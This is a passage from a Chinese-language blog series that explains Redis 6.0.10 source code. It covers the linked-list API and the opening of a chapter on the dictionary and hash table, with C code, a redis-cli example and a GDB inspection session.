<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listInsertNode(list *list, listNode *old_node, void *value, int after) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (after) &#123;</span><br><span class="line">        node-&gt;prev = old_node;</span><br><span class="line">        node-&gt;next = old_node-&gt;next;</span><br><span class="line">        if (list-&gt;tail == old_node) &#123;</span><br><span class="line">            list-&gt;tail = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;next = old_node;</span><br><span class="line">        node-&gt;prev = old_node-&gt;prev;</span><br><span class="line">        if (list-&gt;head == old_node) &#123;</span><br><span class="line">            list-&gt;head = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (node-&gt;prev != NULL) &#123;</span><br><span class="line">        node-&gt;prev-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    if (node-&gt;next != NULL) &#123;</span><br><span class="line">        node-&gt;next-&gt;prev = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>after等于1时，在给定old_node节点之后插入，否则在给定节点前插入。</p>
<h4 id="删除指定节点"><a href="#删除指定节点" class="headerlink" title="删除指定节点"></a>删除指定节点<span id="jump11"></span></h4><p>调用<code>listDelNode</code>， 删除指定节点，时间复杂度为O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void listDelNode(list *list, listNode *node) &#123;</span><br><span class="line">    if (node-&gt;prev)</span><br><span class="line">        node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">    else</span><br><span class="line">        list-&gt;head = node-&gt;next;</span><br><span class="line">    if (node-&gt;next)</span><br><span class="line">        node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">    else</span><br><span class="line">        list-&gt;tail = node-&gt;prev;</span><br><span class="line">    if (list-&gt;free) list-&gt;free(node-&gt;value);</span><br><span class="line">    zfree(node);</span><br><span class="line">    list-&gt;len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="链表迭代器的设计实现"><a href="#链表迭代器的设计实现" class="headerlink" title="链表迭代器的设计实现"></a>链表迭代器的设计实现<span id="jump12"></span></h4><p>定义<code>struct listIter</code>结构体实现链表的迭代器，支持双向迭代。(类似C++容器的begin()和rbegin()操作)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Directions for iterators */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL_START_HEAD 0			<span class="comment">// 正向迭代, head -&gt; tail</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL_START_TAIL 1			<span class="comment">// 反向迭代，tail -&gt; head</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listIter</span> &#123;</span></span><br><span class="line">    listNode *next;</span><br><span class="line">    <span class="type">int</span> direction;	<span class="comment">// 取值有两种，AL_START_HEAD或AL_START_TAIL，支持双向迭代。</span></span><br><span class="line">&#125; listIter;</span><br></pre></td></tr></table></figure>

<p>通过<code>listGetIterator</code>，创建一个正向&#x2F;反向迭代器：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">listIter *<span class="title function_">listGetIterator</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">int</span> direction)</span> &#123;</span><br><span class="line">    listIter *iter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((iter = zmalloc(<span class="keyword">sizeof</span>(*iter))) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (direction == AL_START_HEAD)		<span class="comment">// 正向迭代器</span></span><br><span class="line">        iter-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        iter-&gt;next = <span class="built_in">list</span>-&gt;tail;		<span class="comment">// 反向迭代器</span></span><br><span class="line">    iter-&gt;direction = direction;</span><br><span class="line">    <span class="keyword">return</span> iter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重置迭代器, 通过<code>listRewind</code>和<code>listRewindTail</code>方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRewind</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, listIter *li)</span> &#123;</span><br><span class="line">    li-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    li-&gt;direction = AL_START_HEAD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">listRewindTail</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, listIter *li)</span> &#123;</span><br><span class="line">    li-&gt;next = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    li-&gt;direction = AL_START_TAIL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>listNext</code>，访问迭代器中的下一个元素：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">listNode *<span class="title function_">listNext</span><span class="params">(listIter *iter)</span> &#123;</span><br><span class="line">    listNode *current = iter-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;direction == AL_START_HEAD)</span><br><span class="line">            iter-&gt;next = current-&gt;next;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            iter-&gt;next = current-&gt;prev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="查找指定节点"><a href="#查找指定节点" class="headerlink" title="查找指定节点"></a>查找指定节点<span id="jump13"></span></h4><p>调用<code>listSearchKey</code>，查找指定节点，平均时间复杂度O(N)，N为链表长度。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listNode *listSearchKey(list *list, void *key) &#123;</span><br><span class="line">    listIter iter;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    listRewind(list, &amp;iter);</span><br><span class="line">    while((node = listNext(&amp;iter)) != NULL) &#123;</span><br><span class="line">        if (list-&gt;match) &#123;</span><br><span class="line">            if (list-&gt;match(node-&gt;value, key)) &#123;</span><br><span class="line">                return node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (key == node-&gt;value) &#123;</span><br><span class="line">                return node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="复制链表"><a href="#复制链表" class="headerlink" title="复制链表"></a>复制链表<span id="jump14"></span></h4><p>调用<code>listDup</code>，复制链表，时间复杂度O(N)，N为链表长度。</p>
<p><strong>实现技巧分析</strong>：通过迭代器隐藏链表内部实现，简化链表遍历操作；通过dup函数指针，统一了不同类型链表节点的复制流程，实现简洁优雅，值得一学。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> *<span class="title function_">listDup</span><span class="params">(<span class="built_in">list</span> *orig)</span> &#123;</span><br><span class="line">    <span class="built_in">list</span> *copy;</span><br><span class="line">    listIter iter;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((copy = listCreate()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copy-&gt;dup = orig-&gt;dup;</span><br><span class="line">    copy-&gt;<span class="built_in">free</span> = orig-&gt;<span class="built_in">free</span>;</span><br><span class="line">    copy-&gt;match = orig-&gt;match;</span><br><span class="line">    listRewind(orig, &amp;iter);</span><br><span class="line">    <span class="keyword">while</span>((node = listNext(&amp;iter)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">void</span> *value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (copy-&gt;dup) &#123;</span><br><span class="line">            value = copy-&gt;dup(node-&gt;value);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                listRelease(copy);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            value = node-&gt;value;</span><br><span class="line">        <span class="keyword">if</span> (listAddNodeTail(copy, value) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            listRelease(copy);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="表头节点移动到表尾"><a href="#表头节点移动到表尾" class="headerlink" title="表头节点移动到表尾"></a>表头节点移动到表尾<span id="jump15"></span></h4><p>通过<code>listRotateHeadToTail</code>，实现表头节点移动到表尾，时间复杂度为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRotateHeadToTail</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listLength(<span class="built_in">list</span>) &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    listNode *head = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="comment">/* Detach current head */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head = head-&gt;next;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* Move it as tail */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;tail-&gt;next = head;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prev = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail = head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>listRotateTailToHead</code>，实现表尾节点移动到表头，时间复杂度为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRotateTailToHead</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listLength(<span class="built_in">list</span>) &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detach current tail */</span></span><br><span class="line">    listNode *tail = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail = tail-&gt;prev;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* Move it as head */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head-&gt;prev = tail;</span><br><span class="line">    tail-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》 第3章 链表</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(三)——字典</title>
    <url>/2021/12/21/2021-12-21-redis-note-03-dict/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>字典是一种用于保存键值对的数据结构，Redis数据库使用字典做为底层实现，字典也是哈希键的底层实现之一。</p>
<p>C语言中并没有内置字典这个数据结构，Redis自己实现了字典。</p>
<p>以下结合源码分析Redis字典的设计与实现，源码版本：<a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<span id="more"></span>

<h2 id="问题思考"><a href="#问题思考" class="headerlink" title="问题思考"></a>问题思考</h2><p>C语言中如何设计一个通用的字典和哈希表？</p>
<ul>
<li><p><a href="#jump1">字典的设计与实现</a></p>
<ul>
<li><a href="#jump2">哈希表和哈希表节点的设计</a></li>
<li><a href="#jump3">字典的数据结构设计</a></li>
<li><a href="#jump4">如何设计多态字典</a></li>
</ul>
</li>
<li><p><a href="#jump5">哈希算法</a></p>
<ul>
<li><a href="#jump6">为什么数组长度设计为2的n次方</a></li>
</ul>
</li>
<li><p><a href="#jump7">如何解决键冲突</a></p>
</li>
<li><p><a href="#jump8">rehash操作</a></p>
<ul>
<li><a href="#jump9">为什么要rehash</a></li>
<li><a href="#jump10">rehash的实现步骤</a></li>
<li><a href="#jump11">为什么不直接复制ht[0]的节点到ht[1]，而是要重新计算哈希索引值再rehash</a></li>
</ul>
</li>
<li><p><a href="#jump12">rehash的触发条件是什么</a></p>
<ul>
<li><a href="#jump13">负载因子的概念</a></li>
<li><a href="#jump14">哈希表扩展策略</a></li>
<li><a href="#jump15">哈希表收缩策略</a></li>
</ul>
</li>
<li><p><a href="#jump16">渐进式rehash</a></p>
<ul>
<li><a href="#jump17">为什么要渐进式</a></li>
<li><a href="#jump18">渐进式rehash的实现</a></li>
<li><a href="#jump19">增、删、改、查场景中的rehash实现</a></li>
</ul>
</li>
<li><p><a href="#jump20">字典API</a></p>
<ul>
<li><a href="#jump21">随机返回一个键值对</a></li>
<li><a href="#jump22">字典迭代器的设计与实现</a></li>
<li><a href="#jump23">dictScan算法</a></li>
</ul>
</li>
</ul>
<h3 id="字典的设计与实现"><a href="#字典的设计与实现" class="headerlink" title="字典的设计与实现"></a>字典的设计与实现<span id="jump1"></span></h3><p>Redis中使用哈希表来实现字典，一个哈希表中有多个哈希表节点，每个节点存储一个键值对。</p>
<h4 id="哈希表和哈希表节点的设计"><a href="#哈希表和哈希表节点的设计" class="headerlink" title="哈希表和哈希表节点的设计"></a>哈希表和哈希表节点的设计<span id="jump2"></span></h4><p>哈希表的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictht</span> &#123;</span></span><br><span class="line">    dictEntry **table;			<span class="comment">// 哈希表数组，每个数组是一个链表 (链地址法)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;			<span class="comment">// 记录哈希表大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sizemask;		<span class="comment">// 掩码，用于计算哈希索引，值总是等于size - 1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> used;			<span class="comment">// 记录已有哈希表节点个数。</span></span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure>

<ul>
<li>table是一个指针数组，每个数组相当于一个链表；<strong>链地址法</strong>实现哈希表</li>
<li>size表示哈希表大小，取值总是为2的幂</li>
<li>sizemask为掩码，用于计算索引，取值总是为size - 1</li>
<li>used记录已有哈希表节点个数</li>
</ul>
<p>一个大小为4的空哈希表如下图：<br><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image1.png"></p>
<p>哈希表节点的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> *key;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">void</span> *val;</span><br><span class="line">		<span class="type">uint64_t</span> u64;</span><br><span class="line">		<span class="type">int64_t</span> s64;</span><br><span class="line">	&#125; v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>key保存键，对于哈希键场景，这个key存储的实际类型是sds</li>
<li>v保存值，设置为联合类型用于保存不同类型的值</li>
<li>next保存链表的下一个节点，以链地址法解决哈希键冲突问题</li>
<li>value保存值，用联合类型的好处是可以保存不同类型的值</li>
</ul>
<h4 id="字典的数据结构设计"><a href="#字典的数据结构设计" class="headerlink" title="字典的数据结构设计"></a>字典的数据结构设计<span id="jump3"></span></h4><p>字典的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span> &#123;</span></span><br><span class="line">    dictType *type;		     <span class="comment">// 类型特定函数</span></span><br><span class="line">    <span class="type">void</span> *privdata;</span><br><span class="line">    dictht ht[<span class="number">2</span>];			 <span class="comment">// 两个哈希表, ht[1]用于rehash</span></span><br><span class="line">    <span class="type">long</span> rehashidx; 		 <span class="comment">/* rehashing not in progress if rehashidx == -1 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> iterators; <span class="comment">/* number of iterators currently running */</span></span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure>

<h4 id="如何设计多态字典？"><a href="#如何设计多态字典？" class="headerlink" title="如何设计多态字典？"></a>如何设计多态字典？<span id="jump4"></span></h4><p>type和privdata用于实现多态字典，dictType结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictType</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> (*hashFunction)(<span class="type">const</span> <span class="type">void</span> *key);			<span class="comment">// 计算hash值</span></span><br><span class="line">    <span class="type">void</span> *(*keyDup)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *key);	<span class="comment">// 复制键</span></span><br><span class="line">    <span class="type">void</span> *(*valDup)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *obj);	<span class="comment">// 复制值</span></span><br><span class="line">    <span class="type">int</span> (*keyCompare)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *key1, <span class="type">const</span> <span class="type">void</span> *key2);	<span class="comment">// 比较键</span></span><br><span class="line">    <span class="type">void</span> (*keyDestructor)(<span class="type">void</span> *privdata, <span class="type">void</span> *key);	<span class="comment">// 销毁键</span></span><br><span class="line">    <span class="type">void</span> (*valDestructor)(<span class="type">void</span> *privdata, <span class="type">void</span> *obj);	<span class="comment">// 销毁值</span></span><br><span class="line">&#125; dictType;</span><br></pre></td></tr></table></figure>

<p>考虑字典的增、删、改、查场景，每个场景必定会涉及如下动作：</p>
<ul>
<li><p>哈希值的计算</p>
</li>
<li><p>键、值的复制</p>
</li>
<li><p>键、值的销毁</p>
</li>
<li><p>比较两个键是否相同</p>
</li>
</ul>
<p>对于不同类型的键值对，以上这些动作的具体实现必定是有差异的。设计dictType的好处在于，通过挂接钩子函数消除这个差异，简化了字典的增、删、改、查等API的实现。（比如复制键的场景，不同类型的键值对只需调用同一个钩子函数<code>keyDup</code>即可）</p>
<p>钩子函数的挂接，在字典创建时完成，参考<code>dictCreate</code>， 时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dict *<span class="title function_">dictCreate</span><span class="params">(dictType *type, <span class="type">void</span> *privDataPtr)</span> &#123;</span><br><span class="line">    dict *d = zmalloc(<span class="keyword">sizeof</span>(*d));</span><br><span class="line">    _dictInit(d,type,privDataPtr);</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _dictInit(dict *d, dictType *type, <span class="type">void</span> *privDataPtr) &#123;</span><br><span class="line">    _dictReset(&amp;d-&gt;ht[<span class="number">0</span>]);</span><br><span class="line">    _dictReset(&amp;d-&gt;ht[<span class="number">1</span>]);</span><br><span class="line">    d-&gt;type = type;				<span class="comment">// 挂接钩子函数</span></span><br><span class="line">    d-&gt;privdata = privDataPtr;</span><br><span class="line">    d-&gt;rehashidx = <span class="number">-1</span>;</span><br><span class="line">    d-&gt;iterators = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ht是一个数组，包含2个哈希表。一般情况下只会用到ht[0]，ht[1]用于字典的rehash操作。</p>
</li>
<li><p>rehashidx表示字典rehash的进度，取值为-1表示没有进行rehash。</p>
</li>
</ul>
<p><strong>举例：</strong></p>
<p>新增一个哈希键key，4个键值对。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset key key1 value1 key2 value2 key3 value3 key4 value4</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;hashtable&quot;</span><br><span class="line">127.0.0.1:6379&gt; hgetall key</span><br><span class="line">1) &quot;key2&quot;</span><br><span class="line">2) &quot;value2&quot;</span><br><span class="line">3) &quot;key4&quot;</span><br><span class="line">4) &quot;value4&quot;</span><br><span class="line">5) &quot;key1&quot;</span><br><span class="line">6) &quot;value1&quot;</span><br><span class="line">7) &quot;key3&quot;</span><br><span class="line">8) &quot;value3&quot;</span><br></pre></td></tr></table></figure>

<p>注：必须先修改redis配置项<code>hash-max-ziplist-value</code>（这个例子中要设置为4），否则这里的哈希键默认编码方式为<code>ziplist</code>，而不是<code>hashtable</code> ！</p>
<p><strong>GDB打印这个字典，具体方法如下：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、打印哈希键key，在0号数据库键空间中先找到这个key。</span></span><br><span class="line">(gdb) p (sds)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">1</span>].key</span><br><span class="line">$<span class="number">1</span> = (sds) <span class="number">0x564377c118c1</span> <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、打印哈希键的值, 注意值也是一个字典结构，有4个键值对</span></span><br><span class="line">(gdb) p *(robj *)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">1</span>].v</span><br><span class="line">$<span class="number">2</span> = &#123;type = <span class="number">4</span>, encoding = <span class="number">2</span>, lru = <span class="number">12185874</span>, refcount = <span class="number">1</span>, ptr = <span class="number">0x564377c20450</span>&#125; <span class="comment">// 字典位于0x564377c20450地址处</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_HASH 4 			<span class="comment">/* Hash object. type = 4*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ENCODING_HT 2   <span class="comment">/* Encoded as hash table， encoding = 2 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、打印这个字典</span></span><br><span class="line">(gdb) <span class="built_in">set</span> print pretty on</span><br><span class="line">(gdb) p *(dict *)<span class="number">0x564377c20450</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  type = <span class="number">0x5643777e4860</span> &lt;hashDictType&gt;,</span><br><span class="line">  privdata = <span class="number">0x0</span>,</span><br><span class="line">  ht = &#123;&#123;							</span><br><span class="line">      table = <span class="number">0x564377c10eb0</span>, <span class="comment">// 哈希表地址0x564377c10eb0</span></span><br><span class="line">      size = <span class="number">4</span>,</span><br><span class="line">      sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">4</span></span><br><span class="line">    &#125;, &#123;			<span class="comment">// ht[1]用于rehash，一般情况下rehashidx=-1，ht[1]用不上</span></span><br><span class="line">      table = <span class="number">0x0</span>,</span><br><span class="line">      size = <span class="number">0</span>,</span><br><span class="line">      sizemask = <span class="number">0</span>,</span><br><span class="line">      used = <span class="number">0</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">  rehashidx = <span class="number">-1</span>,	<span class="comment">// 等于-1表示没有进行rehash</span></span><br><span class="line">  iterators = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4、打印字典中的哈希表，哈希表中的指针数组长度为4</span></span><br><span class="line"><span class="comment">// 索引0的链表长度为1，内容：(key, value2) -&gt; NULL</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">0</span>]</span><br><span class="line">$<span class="number">4</span> = (dictEntry *) <span class="number">0x564377c1a250</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;key</span><br><span class="line">$<span class="number">5</span> = (sds) <span class="number">0x564377c10ee1</span> <span class="string">&quot;key2&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;v</span><br><span class="line">$<span class="number">6</span> = (sds) <span class="number">0x564377c1a231</span> <span class="string">&quot;value2&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引1的链表长度为0</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">1</span>]</span><br><span class="line">$<span class="number">8</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引2的链表长度为2，内容：(key4, value4) -&gt; (key1, value1)</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">2</span>]</span><br><span class="line">$<span class="number">9</span> = (dictEntry *) <span class="number">0x564377c0f530</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;key</span><br><span class="line">$<span class="number">10</span> = (sds) <span class="number">0x564377c1a1b1</span> <span class="string">&quot;key4&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;v</span><br><span class="line">$<span class="number">11</span> = (sds) <span class="number">0x564377c1a1d1</span> <span class="string">&quot;value4&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;next</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x564377c1a500</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;key</span><br><span class="line">$<span class="number">13</span> = (sds) <span class="number">0x564377c10dd1</span> <span class="string">&quot;key1&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;v</span><br><span class="line">$<span class="number">14</span> = (sds) <span class="number">0x564377c1a4e1</span> <span class="string">&quot;value1&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;next</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引3的链表长度为1, 内容：(key3, value3) -&gt; NULL</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">3</span>]</span><br><span class="line">$<span class="number">16</span> = (dictEntry *) <span class="number">0x564377c1a190</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a190</span>)-&gt;key</span><br><span class="line">$<span class="number">17</span> = (sds) <span class="number">0x564377c1a151</span> <span class="string">&quot;key3&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a190</span>)-&gt;v</span><br><span class="line">$<span class="number">18</span> = (sds) <span class="number">0x564377c1a171</span> <span class="string">&quot;value3&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a171</span>)-&gt;next</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br></pre></td></tr></table></figure>



<p>下图展示了这个字典：<br><img src="/2021/12/21/2021-12-21-redis-note-03-dict/image2.png"></p>
<h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法<span id="jump5"></span></h3><p>Redis内置两种哈希算法：</p>
<ul>
<li><code>dictGenHashFunction</code> 用于字符串哈希，区分大小写。</li>
<li><code>dictGenCaseHashFunction</code>用于字符串哈希，不区分大小写。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The default hashing function uses SipHash implementation in siphash.c. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">dictGenHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> siphash(key,len,dict_hash_function_seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">dictGenCaseHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> siphash_nocase(buf,len,dict_hash_function_seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>索引值如何计算？</strong></p>
